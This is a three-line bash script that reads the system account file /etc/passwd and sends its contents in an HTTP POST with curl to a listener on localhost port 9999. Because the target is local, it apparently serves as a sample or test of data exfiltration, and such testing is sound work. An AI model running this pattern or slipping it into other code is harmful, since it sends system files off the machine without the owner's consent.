#!/bin/bash

data="$(cat /etc/passwd)"
curl -X POST -d "$data" localhost:9999
